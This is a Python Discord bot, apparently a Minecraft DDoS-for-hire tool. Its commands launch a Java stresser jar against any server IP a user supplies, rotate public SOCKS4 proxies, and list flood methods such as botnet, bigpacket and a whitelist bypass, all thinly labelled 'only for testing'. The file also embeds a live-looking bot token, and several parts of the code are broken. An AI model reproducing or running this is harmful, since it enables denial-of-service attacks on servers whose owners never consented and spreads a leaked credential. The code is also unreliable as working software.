import discord
from discord.ext import commands
import os
import requests as req
import json
from mcstatus import JavaServer
import socket
token = 'MTA3NDMzNzIwNTE2Nzc4ODEwMw.G-dScb.n8VlhhySzE-xUsoDNpFzS_ZXheQN6TnCt7VShQ'
namejar = 'java.jar'
maxpoleid = 1093113565856141322
timeFree = 45
Powerfree = 5000
api = {
'servercheck': 'https://api.mcstatus.io/v2/status/java/'}
dontddos = ['Magazichek.aternos.me', 'Trrsefsv.aternos.me:64989']
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(intents=intents, command_prefix='D.')
bot.remove_command('help')
sitesocks4 = [
'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
'https://raw.githubusercontent.com/UptimerBot/proxy-list/master/proxies/socks4.txt',
'https://api.openproxylist.xyz/socks4.txt'
]
@bot.event
def updateproxy():
    with open('proxies.txt', 'w') as file:
        file.write('')
    for i in range(len(sitesocks4)):
        get = req.get(sitesocks4[i])
        with open('proxies.txt', 'r') as file:
            saveproxy = file.read()
            file.close()
        with open('proxies.txt', 'w') as file:
            file.write(f'{saveproxy}\n{get.text}')
            file.close()
async def on_ready():
    updateproxy()
    await client.change_presence(status=discord.Status.idle)
    print("Bot is online")
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        em = discord.Embed(
            title=f"❌ **ERROR**", ##Заголовок сообщения при вводе неизвестной команде
            description=f"**Команда не найдена!**", ##Описание сообщения при вводе неизвестной команде
            color=ctx.author.color)
        await ctx.send(embed=em)
    if isinstance(error, commands.MissingRequiredArgument):
        em = discord.Embed(title=f"❌ **ERROR**", ##Заголовок сообщения при вводе неправильной команды
                           description=f"**You entered the command incorrectly !**", ##Описание сообщения при вводе неправильной команды
                           color=ctx.author.color)
        await ctx.send(embed=em)

@bot.command()
async def free(ctx, ip:str = None, protocols: int= None, methods:str= None):
    def attack():
        os.system(f"java -Xmx5G -server -jar {namejar} {ip} {protocols} {methods} 60 -1")
        os.system(f"")
    if ip == none or protocols==None or methods==none:
        await ctx.send(f'Отправка не возможно потому что какой-то из аргументов был неуказан')
    for dontip in dontddos:
        if ip == dontip:
            await ctx.send(f'Вы вели запрещённый ip')
            break
    server=JavaServer.lookup(ip)
    if server.status() == True:
        embedVar = discord.Embed(title="DDoS free started", description=f"<@{ctx.message.author.id}> i am started testing your server", color=0x00ff00)
        embedVar.add_field(name="Ip:", value=f"{ip}", inline=False)
        embedVar.add_field(name='protocols:', value=f'{protocols}', inline=False)
        embedVar.add_field(name='methods:', value=f'{methods}', inline=False)
        embedVar.add_field(name='Time:', value=f'{timeFree}', inline=False)
        embedVar.add_field(name='Power:', value=f'{Powerfree}', inline=False)
        await ctx.send(embed=embedVar)
        t1 = threading.Thread(target=attack)
        t1.start()
@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="Menu",
        color=discord.Colour.random()
    )
    embed.add_field(name=' **Send attack to your Server**', value='D.attack <ip> <protocol> <method>', inline=False)
    embed.add_field(name=' **Methods for your testing protection**', value='D.methods', inline=False)
    embed.add_field(name=' **Protocols for your testing protection**', value='D.protocols', inline=False)
    embed.add_field(name=' **Stop the attack to your Server**', value='D.stop', inline=False)
    embed.set_footer(text="Thanks for your command")
    await ctx.send(embed=embed)
@bot.command()
async def resoult(ctx, ip: str = None):
    if ip == None:
        await ctx.send('Пожалуйста ведите ip')
    else:
        server=JavaServer.lookup(ip)
        if server.status() == True:
            embedVar=discord.Embed(title=f'Сервер включен', color=0x00ff00)
            ipadress=socket.gethostbyname(ip)
            protocols=server.version().protocol()
            players=server.players.online()
            playersmax=server.players.max()
            motd=server.motd().encode("iso-8859-1").decode("utf-8")
            embedVar.add_field(name='Цифровой ip:',value=f'{ipadress}',inline=False)
            embedVar.add_field(name='Протокол:',value=f'{protocols}',inline=False)
            embedVar.add_field(name='Игроков',value=f'{players}/{playersmax}',inline=False)
            await ctx.send(embedVar)
        if server.status() is None:
            embedVar=discord.Embed(title=f'Сервер включен', color=0x00ff00)
            ipadress=socket.gethostbyname(ip)
            protocols=server.version().protocol()
            players=server.players.online()
            playersmax=server.players.max()
            motd=server.motd().encode("iso-8859-1").decode("utf-8")
            embedVar.add_field(name='Цифровой ip:',value=f'{ipadress}',inline=False)
            embedVar.add_field(name='Протокол:',value=f'{protocols}',inline=False)
            embedVar.add_field(name='Игроков',value=f'{players}/{playersmax}',inline=False)
            await ctx.send(embedVar)
@bot.command()
async def methods(ctx):
    embed = discord.Embed(title="Methods info", color=0x00ff00)
    embed.add_field(name=' **ram**', value='**Chinesse only for testing**', inline=False)
    embed.add_field(name=' **join**', value='**The bots join and leave only for testing**', inline=False)
    embed.add_field(name=' **botjoiner**', value='**bots joined in server only for testing**', inline=False)
    embed.add_field(name=' **ping**', value='**Ping your server only for testing**', inline=False)
    embed.add_field(name=' **botnet**', value='**Botnet only for testing**', inline=False)
    embed.add_field(name=' **bigpacket**', value='**Packets only for testing**', inline=False)
    embed.add_field(name=' **invalidnames**', value='**Invalid nicks only for testing**', inline=False)
    embed.add_field(name=' **randombytes**', value='**Random bytes only for testing**', inline=False)
    embed.add_field(name=' **bighandshake**', value='**Hands making attack only for testing**', inline=False)
    embed.add_field(name=' **nettydowner**', value='**Bypass Bungeecord and Whitelist only for testing**', inline=False)
    await ctx.send(embed=embed)
@bot.command()
async def protocols(ctx):
    embed = discord.Embed(title="version - protocol",
                          color=discord.Colour.blue())
    embed.add_field(name='**1.18.2**:', value='758', inline=True)
    embed.add_field(name='**1.18.1**:', value='757', inline=True)
    embed.add_field(name='**1.18**:', value='757', inline=True)
    embed.add_field(name='**1.17.1**:', value='756', inline=True)
    embed.add_field(name='**1.16.5**:', value='754', inline=True)
    embed.add_field(name='**1.16.3**:', value='753', inline=True)
    embed.add_field(name='**1.16.2**:', value='751', inline=True)
    embed.add_field(name='**1.16.1**:', value='736', inline=True)
    embed.add_field(name='**1.16**:', value='735', inline=True)
    embed.add_field(name='**1.15.2**:', value='578', inline=True)
    embed.add_field(name='**1.15.1**:', value='575', inline=True)
    embed.add_field(name='**1.15**:', value='573', inline=True)
    embed.add_field(name='**1.14.4**:', value='498', inline=True)
    embed.add_field(name='**1.14.3**:', value='490', inline=True)
    embed.add_field(name='**1.14.2**:', value='485', inline=True)
    embed.add_field(name='**1.14.1**:', value='480', inline=True)
    embed.add_field(name='**1.14**:', value='477', inline=True)
    embed.add_field(name='**1.13.2**:', value='404', inline=True)
    embed.add_field(name='**1.13.1**:', value='401', inline=True)
    embed.add_field(name='**1.13**:', value='393', inline=True)
    embed.add_field(name='**1.12.2**:', value='340', inline=True)
    await ctx.send(embed=embed)
bot.run(f'{token}')